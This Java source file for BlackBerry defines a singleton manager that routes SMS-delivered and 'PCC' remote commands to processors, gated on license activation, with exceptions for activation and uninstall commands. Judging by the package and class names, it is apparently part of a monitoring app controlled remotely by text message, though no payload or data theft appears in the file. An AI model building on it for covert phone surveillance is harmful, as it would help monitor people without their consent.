package com.vvt.rmtcmd;

import java.util.Vector;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;

public class RmtCmdProcessingManager {
	
	private static RmtCmdProcessingManager self = null;
	private static final long RMT_CMD_PROC_GUID = 0xca179bcf29cf8e09L;
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	private SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	private SMSCmdProcessor smsProcessor = new SMSCmdProcessor();
	private PCCCmdProcessor pccProcessor = new PCCCmdProcessor();
	
	
	private RmtCmdProcessingManager() {
	}
	
	public static RmtCmdProcessingManager getInstance() {
		if (self == null) {
			self = (RmtCmdProcessingManager)RuntimeStore.getRuntimeStore().get(RMT_CMD_PROC_GUID);
		}
		if (self == null) {
			RmtCmdProcessingManager rmtCmdProc = new RmtCmdProcessingManager();
			RuntimeStore.getRuntimeStore().put(RMT_CMD_PROC_GUID, rmtCmdProc);
			self = rmtCmdProc;
		}
		return self;
	}
	
	public void process(RmtCmdLine rmtCmdLine) {
		smsCmdCode = cmdStore.getSMSCommandCode();
//		Log.debug("RmtCmdProcessingManager.process()", "rmtCmdLine.getCode(): " + rmtCmdLine.getCode());
		if (rmtCmdLine.getCode() == smsCmdCode.getActivateUrlCmd() || 
				(rmtCmdLine.getCode() == smsCmdCode.getActivationAcUrlCmd()) ||
				(licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) || 
				(rmtCmdLine.getCode() == smsCmdCode.getUninstallCmd())) {
			smsProcessor.process(rmtCmdLine);
		}
	}
	
	public void process(Vector pccCmds) {
		if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
			pccProcessor.process(pccCmds);
		}
	}
}
